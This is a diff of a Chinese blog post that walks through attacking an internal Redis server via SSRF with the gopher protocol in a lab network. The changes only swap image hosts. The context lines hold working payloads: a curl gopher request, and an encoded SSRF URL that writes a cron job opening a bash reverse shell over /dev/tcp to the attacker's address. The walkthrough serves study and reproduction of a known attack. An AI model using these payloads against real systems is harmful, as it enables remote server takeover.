@@ -18,10 +18,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// redis 服务器执行</span><br><span class="line">$ socat -v tcp-listen:4444,fork tcp-connect:192.168.0.100:6379</span><br></pre></td></tr></table></figure>
 
 <p>然后在攻击机 <code>redis-cli</code> 连接 redis 服务器的 4444 端口，运行一些常见指令，这里 redis 的密码是 123456。</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.40.02.jpg" alt="Screenshot 2020-06-26 上午4.40.02"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.40.02.jpg" alt="Screenshot 2020-06-26 上午4.40.02"></p>
 <p>命令依次是输入密码、显示所有键，输出 <code>name</code> 键的值。</p>
 <p>查看 redis 服务器，得到的回显如下：</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.39.59.jpg" alt="Screenshot 2020-06-26 上午4.39.59"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.39.59.jpg" alt="Screenshot 2020-06-26 上午4.39.59"></p>
 <p>那么，如果我们构造 gopher 的 <code>DATA</code> 也是这种格式的话，就可以获取到数据。借助 web 服务器利用 SSRF 就可以达到攻击内网 redis 的目的。</p>
 <h3 id="gopher-协议转换规则"><a href="#gopher-协议转换规则" class="headerlink" title="gopher 协议转换规则"></a>gopher 协议转换规则</h3><p>gopher 协议支持 url 编码后的 % 编码，但很多字符用常见的 url 编码器并不会编码，如果部分字符不编码，则 <code>curl</code> 不解析。所以最好所有字符都编码。</p>
 <p>简单记录几点：</p>
@@ -34,11 +34,11 @@
 </ul>
 </blockquote>
 <h2 id="📍-构造和生成-Payload"><a href="#📍-构造和生成-Payload" class="headerlink" title="📍 构造和生成 Payload"></a>📍 构造和生成 Payload</h2><p>写了一个<a href="https://github.com/NickYan7/gopher_payload_generator" target="_blank" rel="noopener">脚本</a>，将 redis 指令写入 <code>bin.txt</code> ，然后脚本直接输出 <code>payload</code> ，如图：</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.59.50.jpg" alt="Screenshot 2020-06-26 上午4.59.50"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.59.50.jpg" alt="Screenshot 2020-06-26 上午4.59.50"></p>
 <p><code>\r</code> 表示换行，这里就不用写了。</p>
 <p>payload：<code>curl gopher://192.168.0.100:6379/_%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%36%0d%0a%31%32%33%34%35%36%0d%0a%2a%32%0d%0a%24%34%0d%0a%6b%65%79%73%0d%0a%24%31%0d%0a%2a%0d%0a</code></p>
 <p><code>curl</code> 支持 gopher 协议。可以看到返回了所有键：</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%885.04.03.jpg" alt="Screenshot 2020-06-26 上午5.04.03"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%885.04.03.jpg" alt="Screenshot 2020-06-26 上午5.04.03"></p>
 <h2 id="📍-SSRF-gopher-攻击内网-Redis"><a href="#📍-SSRF-gopher-攻击内网-Redis" class="headerlink" title="📍 SSRF+gopher 攻击内网 Redis"></a>📍 SSRF+gopher 攻击内网 Redis</h2><h3 id="写入-crontab-计划任务反弹-shell"><a href="#写入-crontab-计划任务反弹-shell" class="headerlink" title="写入 crontab 计划任务反弹 shell"></a>写入 crontab 计划任务反弹 shell</h3><p>写入 crontab 计划任务需要目标的 redis 服务是 root 权限，其实有点苛刻。简述一下环境：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0.101 攻击者</span><br><span class="line">0.100 redis 服务器，只开放给局域网内</span><br><span class="line">0.105 web 服务器，php 支持 curl_exec</span><br></pre></td></tr></table></figure>
 
@@ -53,9 +53,9 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.0.105/ssrf_test/ssrf.php?url=gopher%3a%2f%2f192.168.0.100%3a6379%2f_*2%250d%250a%244%250d%250aauth%250d%250a%246%250d%250a123456%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2fvar%2fspool%2fcron%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250axxx%250d%250a%2462%250d%250a%250a%250a*%2f1+*+*+*+*+%2fbin%2fbash+-i%3e%26%2fdev%2ftcp%2f192.168.0.101%2f4646+0%3e%261%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a</span><br></pre></td></tr></table></figure>
 
 <p>浏览器访问（没有回显）：</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.42.jpg" alt="Screenshot 2020-06-26 上午7.40.42"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.42.jpg" alt="Screenshot 2020-06-26 上午7.40.42"></p>
 <p>一分钟后，攻击者的机器弹回内网 redis 服务器的 shell：</p>
-<p><img src="//naykcin.top/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.22.jpg" alt="Screenshot 2020-06-26 上午7.40.22"></p>
+<p><img src="//mucfo.cn/2020/06/26/ssrf-gopher/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.22.jpg" alt="Screenshot 2020-06-26 上午7.40.22"></p>
 <h2 id="📍-后话"><a href="#📍-后话" class="headerlink" title="📍 后话"></a>📍 后话</h2><p>这只是 SSRF+gopher 众多玩法中的一点而已，复现过程中其实小坑还是蛮多的：</p>
 <ul>
 <li><code>curl</code> 的 payload 格式和 http 请求的格式有些许不同，为此我写了两个用来转换 payload 的脚本。</li>
